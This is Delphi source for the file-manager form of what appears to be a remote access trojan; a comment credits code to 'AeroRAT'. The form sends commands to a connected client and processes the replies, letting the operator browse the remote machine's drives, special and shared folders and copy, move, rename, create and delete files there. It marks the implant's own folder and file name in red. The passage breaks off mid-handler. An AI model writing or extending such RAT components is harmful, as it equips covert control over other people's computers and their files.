unit UnitFilesManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, jpeg, ExtCtrls, acImage, UnitMain, StdCtrls,
  ListViewEx, Menus, ImgList, UnitVariables, UnitConstants, Buttons, UnitFunctions,
  UnitCommands, SocketUnitEx, sSpeedButton, CommCtrl, UnitManager, ShellAPI,
  UnitRepository, UnitImagePreview, DateUtils, uJSONConfig;

type
  TFormFilesManager = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn2: TToolButton;
    pnlExplorer: TPanel;
    pnlSearch: TPanel;
    spl1: TSplitter;
    tv1: TTreeView;
    lvSearch: TListView;
    pnl1: TPanel;
    lbl2: TLabel;
    lbl3: TLabel;
    edtPath: TEdit;
    edtFilename: TEdit;
    chkSubdir: TCheckBox;
    btn6: TButton;
    btn9: TButton;
    btn10: TToolButton;
    pb1: TProgressBar;
    pm1: TPopupMenu;
    R1: TMenuItem;
    D1: TMenuItem;
    N2: TMenuItem;
    L1: TMenuItem;
    L2: TMenuItem;
    pm2: TPopupMenu;
    R2: TMenuItem;
    N1: TMenuItem;
    O1: TMenuItem;
    N3: TMenuItem;
    E1: TMenuItem;
    H1: TMenuItem;
    V1: TMenuItem;
    V2: TMenuItem;
    C1: TMenuItem;
    P2: TMenuItem;
    C2: TMenuItem;
    N5: TMenuItem;
    N6: TMenuItem;
    E2: TMenuItem;
    N7: TMenuItem;
    R3: TMenuItem;
    I1: TMenuItem;
    M1: TMenuItem;
    C4: TMenuItem;
    D2: TMenuItem;
    U1: TMenuItem;
    S3: TMenuItem;
    M2: TMenuItem;
    pm3: TPopupMenu;
    G1: TMenuItem;
    D3: TMenuItem;
    N9: TMenuItem;
    E5: TMenuItem;
    V3: TMenuItem;
    H2: TMenuItem;
    N10: TMenuItem;
    S1: TMenuItem;
    D5: TMenuItem;
    dlgOpen1: TOpenDialog;
    N4: TMenuItem;
    C5: TMenuItem;
    E7: TMenuItem;
    N11: TMenuItem;
    P1: TMenuItem;
    lvFiles: TListView;
    T1: TMenuItem;
    P3: TMenuItem;
    C3: TMenuItem;
    E4: TMenuItem;
    E3: TMenuItem;
    R4: TMenuItem;
    H3: TMenuItem;
    V4: TMenuItem;
    H4: TMenuItem;
    V5: TMenuItem;
    E6: TMenuItem;
    R5: TMenuItem;
    H5: TMenuItem;
    V6: TMenuItem;
    H6: TMenuItem;
    V7: TMenuItem;
    N8: TMenuItem;
    M3: TMenuItem;
    D4: TMenuItem;
    R6: TMenuItem;
    D6: TMenuItem;
    E8: TMenuItem;
    pnl2: TPanel;
    pnl3: TPanel;
    btn3: TSpeedButton;
    btn4: TSpeedButton;
    btn5: TSpeedButton;
    S2: TMenuItem;
    btn7: TToolButton;
    pnlTransfers: TPanel;
    lvTransfers: TListViewEx;
    pm4: TPopupMenu;
    MenuItem1: TMenuItem;
    MenuItem2: TMenuItem;
    MenuItem3: TMenuItem;
    MenuItem4: TMenuItem;
    spl2: TSplitter;
    N12: TMenuItem;
    R8: TMenuItem;
    A1: TMenuItem;
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure tv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure lvFilesContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure lvSearchContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure L1Click(Sender: TObject);
    procedure L2Click(Sender: TObject);
    procedure tv1DblClick(Sender: TObject);
    procedure lvFilesDblClick(Sender: TObject);
    procedure O1Click(Sender: TObject);
    procedure G1Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure N3Click(Sender: TObject);
    procedure H1Click(Sender: TObject);
    procedure V1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure P2Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure M1Click(Sender: TObject);
    procedure C4Click(Sender: TObject);
    procedure I1Click(Sender: TObject);
    procedure E2Click(Sender: TObject);
    procedure E4Click(Sender: TObject);
    procedure D2Click(Sender: TObject);
    procedure C5Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure btn9Click(Sender: TObject);
    procedure V3Click(Sender: TObject);
    procedure H2Click(Sender: TObject);
    procedure E7Click(Sender: TObject);
    procedure D5Click(Sender: TObject);
    procedure P1Click(Sender: TObject);
    procedure lvFilesCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure tv1CustomDrawItem(Sender: TCustomTreeView; Node: TTreeNode;
      State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure FormShow(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure U1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure P3Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure H4Click(Sender: TObject);
    procedure V5Click(Sender: TObject);
    procedure H3Click(Sender: TObject);
    procedure V4Click(Sender: TObject);
    procedure H5Click(Sender: TObject);
    procedure V6Click(Sender: TObject);
    procedure H6Click(Sender: TObject);
    procedure V7Click(Sender: TObject);
    procedure tv1Change(Sender: TObject; Node: TTreeNode);
    procedure lvFilesKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure M3Click(Sender: TObject);
    procedure D4Click(Sender: TObject);
    procedure R6Click(Sender: TObject);
    procedure E8Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure btn7Click(Sender: TObject);
    procedure lvTransfersColumnResize(sender: TCustomListView; columnIndex,
      columnWidth: Integer);
    procedure MenuItem1Click(Sender: TObject);
    procedure MenuItem3Click(Sender: TObject);
    procedure MenuItem4Click(Sender: TObject);
    procedure lvFilesColumnClick(Sender: TObject; Column: TListColumn);
    procedure A1Click(Sender: TObject);
    procedure R8Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }     
    Client: TClientDatas;
    LastNode: TTreeNode;
    ClipboardPath: string;
    SpecialsIcons: array[0..35] of Integer;
    TmpForm1: TFormImagePreview;
    ForwardPath, BackwardPath, BookmarksPath: string;
    procedure GetSelectedNode(FullPath: string);  
    function IsImageFile(Ext: string): Boolean;
    function IsExeFile(Ext: string): Boolean;
    procedure LoadFolders(Path: string; Stream: TMemoryStream);
    procedure LoadFiles(Path: string; Stream: TMemoryStream);
    procedure LoadBookmarks;
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }
    ExplorerPath: string;
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormFilesManager: TFormFilesManager;

implementation

uses
  UnitEditFile, UnitFtpManager, UnitAttributes;

type
  TDriveInfos = class
    Infos: string;
  end;

var
  LastColumn: TListColumn;
  Ascending: Boolean;
  ImageType: array[0..10] of string = ('.bmp', '.dib', '.jpg', '.jpeg', '.jpe',
    '.ico', '.jfif', '.gif', '.png', '.tif', '.tiff');
  ExeType: array[0..10] of string = ('.exe', '.dll', '.zip', '.rar', '.mp4',
    '.mp3', '.avi', '.3gp', '.iso', '.flv', '.tmp');

const
  SpecialsFolders = 'Specials folders';
  SharedFolders = 'Shared folders';
  Bookmarks = 'Bookmarks';

{$R *.dfm}

constructor TFormFilesManager.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;
           
procedure TFormFilesManager.AddLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormFilesManager.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormFilesManager.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormFilesManager.btn1Click(Sender: TObject);
begin
  pnlExplorer.BringToFront;
  if tv1.Items.Count = 0 then R1Click(Sender);
end;

procedure TFormFilesManager.btn2Click(Sender: TObject);
begin
  pnlSearch.BringToFront;
  edtPath.Text := ExplorerPath;
end;

procedure TFormFilesManager.FormCreate(Sender: TObject);
var
  i: Integer;
begin             
  lvSearch.SmallImages := FormMain.ImagesList;
  lvFiles.SmallImages := FormMain.ImagesList;
  tv1.Images := FormMain.ImagesList;
end;

function GetDriveIcon(DriveType: Integer): Integer;
begin
  case DriveType of
    DRIVE_UNKNOWN: Result := 10;
    DRIVE_REMOVABLE: Result := 6;
    DRIVE_FIXED: Result := 8;
    DRIVE_REMOTE: Result := 9;
    DRIVE_CDROM: Result := 177;
    DRIVE_RAMDISK: Result := 12;
  end;
end;
   
function FileAttributes(FindData: TWIN32FindData): string;
begin
  Result := '';
  if FindData.dwFileAttributes and $00000010 <> 0 then Result := Result + 'D';
  if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
  if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
  if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
  if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
end;

//From AeroRAT
function FileTimeToDateTime(FileTime : TFileTime) : TDateTime;
var
  LocalTime : TFileTime;
  SystemTime : TSystemTime;
begin
  Result := EncodeDate(1900, 1, 1);
  FileTimeToLocalFileTime(FileTime, LocalTime);
  FileTimeToSystemTime(LocalTime, SystemTime);
  Result := SystemTimeToDateTime(SystemTime);
end;

procedure TFormFilesManager.LoadFolders(Path: string; Stream: TMemoryStream);
var
  TmpNode: TTreeNode;
  TmpStr: string;
  TmpItem: TListItem;
  TmpStream: TMemoryStream;
  FindData: TWin32FindData;                     
begin
  tv1.Items.BeginUpdate;
  lvFiles.Items.BeginUpdate;

  GetSelectedNode(Path);
  LastNode.DeleteChildren;

  while Stream.Position < Stream.Size do
  begin
    Self.Refresh;
    Application.ProcessMessages;
    Stream.Read(FindData, SizeOf(TWin32FindData));
    pb1.Position := Stream.Position;

    if string(FindData.cFileName) = '.' then Continue;
    if FindData.cFileName = '..' then Continue;

    if FindData.dwFileAttributes and $00000010 <> 0 then
    begin
      TmpNode := tv1.Items.AddChild(LastNode, FindData.cFileName);

      TmpStr := FileAttributes(FindData);
      if Pos('H', TmpStr) > 0 then
      begin
        TmpNode.Data := TObject(clGray);
        TmpNode.Cut := True;
      end;

      if FindData.cFileName = Client.Infos.Foldername then TmpNode.Data := TObject(clRed);
      TmpNode.ImageIndex := 3;
      TmpNode.SelectedIndex := 3;
      LastNode.Expand(False);

      TmpItem := lvFiles.Items.Add;
      TmpItem.Caption := FindData.cFileName;
      TmpItem.SubItems.Add('DIR');
      TmpItem.SubItems.Add(FileSizeToStr(FindData.nFileSizeLow));

      TmpStr := FileAttributes(FindData);
      if Pos('H', TmpStr) > 0 then TmpItem.Cut := True;
      TmpItem.SubItems.Add(TmpStr);

      TmpItem.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftCreationTime)));
      TmpItem.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftLastWriteTime)));

      if FindData.cFileName = Client.Infos.FolderName then
        TmpItem.Data := TObject(clRed)
      else
      begin
        if TmpItem.Cut then
        TmpItem.Data := TObject(clGray);
      end;
      
      TmpItem.ImageIndex := 3;
    end;
  end;

  tv1.Items.EndUpdate;
  lvFiles.Items.EndUpdate;
end;

procedure TFormFilesManager.LoadFiles(Path: string; Stream: TMemoryStream);
var
  TmpStr: string;
  TmpItem: TListItem;
  FindData: TWin32FindData;
begin
  lvFiles.Items.BeginUpdate;

  while Stream.Position < Stream.Size do
  begin             
    Self.Refresh;
    Application.ProcessMessages;
    Stream.Read(FindData, SizeOf(TWin32FindData));
    pb1.Position := Stream.Position;

    if string(FindData.cFileName) = '.' then Continue;
    if FindData.cFileName = '..' then Continue;
    if FindData.dwFileAttributes and $00000010 <> 0 then Continue;

    TmpItem := lvFiles.Items.Add;
    TmpItem.Caption := FindData.cFileName;
    TmpItem.SubItems.Add(UpperCase(ExtractFileExt(FindData.cFileName)));
    TmpItem.SubItems.Add(FileSizeToStr(FindData.nFileSizeLow));

    TmpStr := FileAttributes(FindData);
    if Pos('H', TmpStr) > 0 then TmpItem.Cut := True;
    TmpItem.SubItems.Add(TmpStr);

    TmpItem.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftCreationTime)));
    TmpItem.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FindData.ftLastWriteTime)));

    if FindData.cFileName = Client.Infos.Filename then
      TmpItem.Data := TObject(clRed)
    else
    begin
      if TmpItem.Cut then
      TmpItem.Data := TObject(clGray);
    end;

    if FileExists(Path + FindData.cFileName) = True then
      TmpItem.ImageIndex := GetImageIndex(Path + FindData.cFileName)
    else TmpItem.ImageIndex := GetImageIndex('*' + ExtractFileExt(FindData.cFileName));
  end;

  lvFiles.Items.EndUpdate;
end;

//From AeroRAT
procedure TFormFilesManager.GetSelectedNode(FullPath: string);
var
  Path: string;
  TmpNode: TTreeNode;
begin
  LastNode := nil;
  if FullPath[Length(FullPath)] <> '\' then FullPath := FullPath + '\';

  while Pos('\', FullPath) > 0 do
  begin           
    Application.ProcessMessages;
    Path := Copy(FullPath, 1, Pos('\', FullPath) - 1);
    Delete(FullPath, 1, Pos('\', FullPath));

    if (Length(Path) = 2) and (Pos(':', Path) > 0) then Path := Path + '\';
    TmpNode := FindNode(Path, tv1, LastNode);

    if TmpNode = nil then
    begin
      if Path = '' then Continue;
      TmpNode := tv1.Items.AddChild(LastNode, Path);
      TmpNode.ImageIndex := 3;
      TmpNode.SelectedIndex := 3;
      TmpNode.Expand(False);
    end
    else TmpNode.Expand(False);

    if TmpNode.Parent <> nil then TmpNode.Parent.Expand(False);
    LastNode := TmpNode;
    LastNode.Expand(False);
  end;
end;

procedure TFormFilesManager.LoadBookmarks;
var
  BKNode, TmpNode: TTreeNode;
  Datas, TmpStr: string;
begin
  BKNode := tv1.Items.Add(nil, Bookmarks);
  BKNode.ImageIndex := 3;
  BKNode.SelectedIndex := 3;

  if BookmarksPath = '' then Exit;

  tv1.Items.BeginUpdate;
  Datas := BookmarksPath;

  while Datas <> '' do
  begin
    Application.ProcessMessages;
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    TmpNode := tv1.Items.AddChild(BKNode, TmpStr);
    TmpNode.ImageIndex := 3;
    TmpNode.SelectedIndex := 3;
  end;

  BKNode.Expanded := True;
  tv1.Items.EndUpdate;
end;

procedure TFormFilesManager.WndProc(var Msg: TMessage);
var
  MainCommand, Datas: string;
  TmpStr, TmpStr1, TmpStr2: string;
  i, j: Integer;
  DrivesNode, SpecialsNode,
  SharedNode, TmpNode: TTreeNode;
  TmpItem: TListItem;
  TmpList: TStringArray;
  dName, dAttrib, FreeSize, TotalSize: string;
  DriveInfos: TDriveInfos;
  Stream: TMemoryStream;
  TmpForm: TFormEditFile;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
begin
  inherited;

  if Msg.Msg = WM_SHOW_EDITFILEFORM then
  begin
    TmpStr := string(Msg.WParam);
    TmpForm := TFormEditFile.Create(Self);
    TmpForm.SetParameters(TFormFilesManager(Client.Forms[2]).Handle, TmpStr);
    TmpForm.Show;
  end;

  if Msg.Msg = WM_SEND_DATAS then
  begin
    TmpStr := string(Msg.WParam);
    Client.SendDatas(TmpStr);
  end;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    MainCommand := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = FILESLISTDRIVES then
    begin
      tv1.Items.Clear;

      if Datas = '' then
      begin
        AddRecvLog('Drives not found', clRed);
        Exit;
      end;

      DrivesNode := tv1.Items.Add(nil, Client.Infos.Computer);
      DrivesNode.ImageIndex := 15;
      DrivesNode.SelectedIndex := 15;

      pb1.Max := StringCount(#13#10, Datas);
      pb1.Position := 0;

      tv1.Items.BeginUpdate;

      while Datas <> '' do
      begin
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;

        TmpStr := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        TmpList := ParseString('|', TmpStr);

        TmpNode := tv1.Items.AddChild(DrivesNode, TmpList[0]);
        TmpNode.ImageIndex := GetDriveIcon(StrToInt(TmpList[1]));
        TmpNode.SelectedIndex := TmpNode.ImageIndex;

        DriveInfos := TDriveInfos.Create;
        DriveInfos.Infos := 'Drive: ' + TmpList[0] + #13#10 + 'File system: ' + TmpList[3] + #13#10 +
          'Type: ' + GetDriveString(StrToInt(TmpList[1])) + #13#10 + 'Name: ' + TmpList[2] + #13#10 +
          'Size: ' + FileSizeToStr(StrToInt64(TmpList[4])) + ' (' + FileSizeToStr(StrToInt64(TmpList[5])) + ' used)';
        TmpNode.Data := DriveInfos;
      end;

      DrivesNode.Expanded := True;
      tv1.Items.EndUpdate;

      AddRecvLog(IntToStr(pb1.Max) + ' drives found');

      //Load bookmarks path
      LoadBookmarks;
    end
    else

    if MainCommand = FILESLISTSPECIALSFOLDERS then
    begin
      if Datas = '' then
      begin
        AddRecvLog('Specials folders not found', clRed);
        Exit;
      end;

      SpecialsNode := tv1.Items.Add(nil, SpecialsFolders);
      SpecialsNode.ImageIndex := 3;
      SpecialsNode.SelectedIndex := 3;

      pb1.Max := StringCount('|', Datas);
      pb1.Position := 0;

      tv1.Items.BeginUpdate;

      while Datas <> '' do
      begin       
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;

        TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
        Delete(Datas, 1, Pos('|', Datas));

        TmpNode := tv1.Items.AddChild(SpecialsNode, TmpStr);
        TmpNode.ImageIndex := 3;
        TmpNode.SelectedIndex := 3;
      end;

      SpecialsNode.Expanded := True;
      tv1.Items.EndUpdate;

      L2.Tag := 1;
      AddRecvLog(IntToStr(pb1.Max) + ' specials folders found');
    end
    else

    if MainCommand = FILESLISTSHAREDFOLDERS then
    begin
      if Datas = '' then
      begin
        AddRecvLog('Shared folders not found', clRed);
        Exit;
      end;

      SharedNode := tv1.Items.Add(nil, SharedFolders);
      SharedNode.ImageIndex := 3;
      SharedNode.SelectedIndex := 3;

      pb1.Max := StringCount('|', Datas);
      pb1.Position := 0;

      tv1.Items.BeginUpdate;

      while Datas <> '' do
      begin
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;
              
        TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
        Delete(Datas, 1, Pos('|', Datas));

        TmpNode := tv1.Items.AddChild(SharedNode, TmpStr);
        TmpNode.ImageIndex := 3;
        TmpNode.SelectedIndex := 3;
      end;

      SharedNode.Expanded := True;
      tv1.Items.EndUpdate;
      L1.Tag := 1;

      AddRecvLog(IntToStr(pb1.Max) + ' shared folders found');
    end
    else

    if MainCommand = FILESLISTFOLDERS then
    begin
      lvFiles.Clear;

      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      pb1.Max := Stream.Size;
      pb1.Position := 0;
      if Stream.Size > 0 then LoadFolders(TmpStr, Stream);
      Stream.Free;
      
      tv1.Enabled := True;
    end
    else

    if MainCommand = FILESLISTFILES then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = '' then
      begin
        if lvFiles.Items.Count = 0 then AddRecvLog('Directory items not found', clRed);
        Exit;
      end;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      pb1.Max := Stream.Size;
      pb1.Position := 0;
      if Stream.Size > 0 then LoadFiles(TmpStr, Stream);
      Stream.Free;                             

      AddRecvLog('Directory set to ' + TmpStr + ' and contains ' + IntToStr(lvFiles.Items.Count) + ' items');
    end
    else

    if MainCommand = FILESNEWFOLDER then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to create folder ' + TmpStr, clRed)
      else
      begin
        lvFiles.Items.BeginUpdate;
        TmpItem := lvFiles.Items.Add;
        TmpItem.Caption := ExtractFileName(TmpStr);
        TmpItem.SubItems.Add('DIR');
        TmpItem.SubItems.Add('0 Byte');
        TmpItem.SubItems.Add('D');
        TmpItem.SubItems.Add('-');   
        TmpItem.SubItems.Add('-');
        TmpItem.ImageIndex := 3;
        lvFiles.Items.EndUpdate;
        
        AddRecvLog('Folder ' + TmpStr + ' created successfully');

        tv1.Items.BeginUpdate;
        TmpStr := TmpStr + '\';
        LastNode := nil;

        while Pos('\', TmpStr) > 0 do
        begin
          Application.ProcessMessages;
          TmpStr1 := Copy(TmpStr, 1, Pos('\', TmpStr) - 1);
          Delete(TmpStr, 1, Pos('\', TmpStr));

          if (Length(TmpStr1) = 2) and (Pos(':', TmpStr1) > 0) then TmpStr1 := TmpStr1 + '\';
          TmpNode := FindNode(TmpStr1, tv1, LastNode);

          if TmpNode = nil then
          begin
            if TmpStr1 = '' then Continue;
            TmpNode := tv1.Items.AddChild(LastNode, TmpStr1);
            TmpNode.ImageIndex := 3;
            TmpNode.SelectedIndex := 3;
            TmpNode.Expand(False);
          end
          else TmpNode.Expand(False);

          if TmpNode.Parent <> nil then TmpNode.Parent.Expand(False);
          LastNode := TmpNode;
          LastNode.Expand(False);
        end;

        tv1.Items.EndUpdate;
      end;
    end
    else
               
    if MainCommand = FILESNEWFILE then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to create file ' + TmpStr, clRed)
      else
      begin   
        lvFiles.Items.BeginUpdate;
        TmpItem := lvFiles.Items.Add;
        TmpItem.Caption := ExtractFileName(TmpStr);
        TmpItem.SubItems.Add(UpperCase(ExtractFileExt(TmpItem.Caption)));
        TmpItem.SubItems.Add('0 Byte');
        TmpItem.SubItems.Add('A');
        TmpItem.SubItems.Add('-');   
        TmpItem.SubItems.Add('-');
        TmpItem.ImageIndex := GetImageIndex('*' + LowerCase(TmpItem.SubItems[0]));
        lvFiles.Items.EndUpdate;

        AddRecvLog('File ' + TmpStr + ' created successfully');
      end;
    end
    else

    if MainCommand = FILESCOPYFOLDER then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to copy folder ' + TmpStr + ' to ' + TmpStr1, clRed)
      else AddRecvLog('Folder ' + TmpStr + ' copied to ' + TmpStr1 + ' successfully');
    end
    else

    if MainCommand = FILESCOPYFILE then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to copy file ' + TmpStr + ' to ' + TmpStr1, clRed)
      else AddRecvLog('File ' + TmpStr + ' copied to ' + TmpStr1 + ' successfully');
    end
    else

    if MainCommand = FILESMOVEFILE then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));  
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to move file ' + TmpStr + ' to ' + TmpStr1, clRed)
      else
      begin
        lvFiles.Items.BeginUpdate;
        for i := lvFiles.Items.Count - 1 downto 0 do
        begin
          Application.ProcessMessages;
          if lvFiles.Items.Item[i].Caption <> ExtractFileName(TmpStr) then Continue;
          lvFiles.Items.Item[i].Delete;
          Break;
        end;

        lvFiles.Items.EndUpdate;
        AddRecvLog('File ' + TmpStr + ' moved to ' + TmpStr1 + ' successfully');
      end;
    end
    else

    if MainCommand = FILESMOVEFOLDER then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));    
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to move folder ' + TmpStr + ' to ' + TmpStr1, clRed)
      else
      begin
        lvFiles.Items.BeginUpdate;
        for i := lvFiles.Items.Count - 1 downto 0 do
        begin
          Application.ProcessMessages;
          if lvFiles.Items.Item[i].Caption <> ExtractFileName(TmpStr) then Continue;
          lvFiles.Items.Item[i].Delete;
          Break;
        end;
        lvFiles.Items.EndUpdate;   
        AddRecvLog('Folder ' + TmpStr + ' moved to ' + TmpStr1 + ' successfully');

        tv1.Items.BeginUpdate;
        TmpStr := TmpStr + '\';
        LastNode := nil;

        while Pos('\', TmpStr) > 0 do
        begin
          Application.ProcessMessages;
          TmpStr1 := Copy(TmpStr, 1, Pos('\', TmpStr) - 1);
          Delete(TmpStr, 1, Pos('\', TmpStr));        
          if (Length(TmpStr1) = 2) and (Pos(':', TmpStr1) > 0) then TmpStr1 := TmpStr1 + '\';
          TmpNode := FindNode(TmpStr1, tv1, LastNode);
          if TmpStr1 = '' then Continue;
          LastNode := TmpNode;
        end;

        LastNode.Delete;
        tv1.Items.EndUpdate;
      end;
    end
    else

    if MainCommand = FILESRENAMEFILE then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
          
      if TmpStr1 = 'N' then
        AddRecvLog('Failed to rename file ' + TmpStr + ' by ' + Datas, clRed)
      else
      begin
        lvFiles.Items.BeginUpdate;
        for i := 0 to lvFiles.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if lvFiles.Items.Item[i].Caption = ExtractFileName(TmpStr) then
          lvFiles.Items.Item[i].Caption := ExtractFileName(Datas);
        end;

        lvFiles.Items.EndUpdate;
        AddRecvLog('File ' + TmpStr + ' renamed by ' + Datas + ' successfully');
      end;
    end
    else

    if MainCommand = FILESRENAMEFOLDER then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if TmpStr1 = 'N' then
        AddRecvLog('Failed to rename folder ' + TmpStr + ' by ' + Datas, clRed)
      else
      begin
        lvFiles.Items.BeginUpdate;
        for i := 0 to lvFiles.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if lvFiles.Items.Item[i].Caption <> ExtractFileName(TmpStr) then Continue;
          lvFiles.Items.Item[i].Caption := ExtractFileName(Datas);
        end;
        lvFiles.Items.EndUpdate;                 
        AddRecvLog('Folder ' + TmpStr + ' renamed by ' + Datas + ' successfully');

        tv1.Items.BeginUpdate;
        TmpStr := TmpStr + '\';
        LastNode := nil;

        while Pos('\', TmpStr) > 0 do
        begin
          Application.ProcessMessages;
          TmpStr1 := Copy(TmpStr, 1, Pos('\', TmpStr) - 1);
          Delete(TmpStr, 1, Pos('\', TmpStr));   
          if (Length(TmpStr1) = 2) and (Pos(':', TmpStr1) > 0) then TmpStr1 := TmpStr1 + '\';
          TmpNode := FindNode(TmpStr1, tv1, LastNode);
          if TmpStr1 = '' then Continue;
          LastNode := TmpNode;
        end;

        LastNode.Text := ExtractFileName(Datas);
        tv1.Items.EndUpdate;
      end;
    end
    else

    if MainCommand = FILESDELETEFILE then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to delete file ' + TmpStr, clRed)
      else
      begin
        lvFiles.Items.BeginUpdate;
        for i := lvFiles.Items.Count - 1 downto 0 do
        begin
          Application.ProcessMessages;
          if lvFiles.Items.Item[i].Caption <> ExtractFileName(TmpStr) then Continue;
          lvFiles.Items.Item[i].Delete;
          Break;
        end;

        lvFiles.Items.EndUpdate;
        AddRecvLog('File ' + TmpStr + ' deleted successfully');
      end;
    end
    else

    if MainCommand = FILESDELETEFOLDER then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to delete folder ' + TmpStr, clRed)
      else
      begin
        lvFiles.Items.BeginUpdate;
        for i := lvFiles.Items.Count - 1 downto 0 do
        begin
          Application.ProcessMessages;
          if lvFiles.Items.Item[i].Caption <> ExtractFileName(TmpStr) then Continue;
          lvFiles.Items.Item[i].Delete;
          Break;
        end;
        lvFiles.Items.EndUpdate;
        AddRecvLog('Folder ' + TmpStr + ' deleted successfully');

        tv1.Items.BeginUpdate;
        TmpStr := TmpStr + '\';
        LastNode := nil;

        while Pos('\', TmpStr) > 0 do
        begin
          Application.ProcessMessages;
          TmpStr1 := Copy(TmpStr, 1, Pos('\', TmpStr) - 1);
